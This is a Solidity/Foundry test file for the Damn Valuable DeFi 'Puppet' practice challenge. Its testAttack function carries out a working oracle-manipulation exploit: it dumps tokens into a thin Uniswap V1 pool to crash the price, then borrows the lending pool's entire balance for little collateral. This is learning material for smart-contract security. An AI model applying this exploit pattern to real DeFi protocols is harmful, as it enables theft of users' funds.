// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@common/uniswap/UniswapV1Exchange.sol";
import "@common/DamnValuableToken.sol";

import "../src/PuppetPool.sol";
import "./Deployer.sol";

contract ProofsOfConcept is Test {
    address _user = makeAddr("user");
    address _attacker = makeAddr("attacker");

    // Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.
    uint256 constant ATTACKER_TOKENS = 1000 ether;
    uint256 constant ATTACKER_ETH = 25 ether;

    Deployer _deployer;

    DamnValuableToken _token;
    PuppetPool _pool;
    UniswapV1Exchange _exchange;

    constructor() {
        _deployer = new Deployer();
        (_token, _pool, _exchange) = _deployer.deploy{value: 10 ether}();

        console.log("Deployer address: %s", address(_deployer));
        console.log("Token address: %s", address(_token));
        console.log("Pool address: %s", address(_pool));
        console.log("Exchange address: %s", address(_exchange));
        console.log("This address: %s", address(this));
        console.log("constructor.msg.sender: %s", address(msg.sender));

        assertEq(
            _exchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(1 ether, 10 ether, 10 ether)
        );
    }

    function testHappyPath() external {
        logState(_user);

        vm.deal(_user, 1000 ether);
        vm.startPrank(_user);

        console.log("~ Borrow 90_000 tokens ~");
        uint256 tokensToBorrow = 90_000;
        _pool.borrow{value: tokensToBorrow * 2}(tokensToBorrow, _user);

        logState(_user);

        console.log("~ Swap token to Eth ~");
        _exchange.ethToTokenSwapInput{value: 1 ether}(
            1,
            block.timestamp + 1 hours
        );

        logState(_user);

        console.log("~ Swap Eth to token ~");
        _token.approve(address(_exchange), 1 ether);
        _exchange.tokenToEthSwapInput(0.01 ether, 1, block.timestamp + 1 hours);

        logState(_user);
    }

    function testAttack() external {
        vm.deal(_attacker, ATTACKER_ETH);
        deal(address(_token), _attacker, ATTACKER_TOKENS);

        uint256 initialPoolTokenBalance = _deployer
            .POOL_INITIAL_TOKEN_BALANCE();

        logState(_attacker);

        vm.startPrank(_attacker);

        console.log("~ Swap token to eth ~");
        _token.approve(address(_exchange), ATTACKER_TOKENS);
        _exchange.tokenToEthSwapInput(
            ATTACKER_TOKENS,
            1, // min eth
            block.timestamp + 1 hours
        );

        logState(_attacker);

        console.log("~ Borrow all tokens from pool ~");
        _pool.borrow{value: _attacker.balance}(
            initialPoolTokenBalance,
            _attacker
        );

        logState(_attacker);

        console.log("~ Swap eth to token ~");
        _exchange.ethToTokenSwapInput{value: _attacker.balance}(
            1, // min token
            block.timestamp + 1 hours
        );

        logState(_attacker);

        assertGt(_token.balanceOf(address(_attacker)), initialPoolTokenBalance);
        assertEq(_token.balanceOf(address(_pool)), 0);
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(
        uint256 tokensSold,
        uint256 tokensInReserve,
        uint256 etherInReserve
    ) internal pure returns (uint256) {
        return
            (tokensSold * 997 * etherInReserve) /
            (tokensInReserve * 1000 + tokensSold * 997);
    }

    function logState(address user) internal view {
        console.log(
            "User eth/token: %d, %d",
            user.balance,
            _token.balanceOf(user)
        );
        console.log(
            "Pool eth/token: %d, %d",
            address(_pool).balance,
            _token.balanceOf(address(_pool))
        );
        console.log(
            "Exchange eth/token: %d, %d",
            address(_exchange).balance,
            _token.balanceOf(address(_exchange))
        );
    }

    receive() external payable {}
}
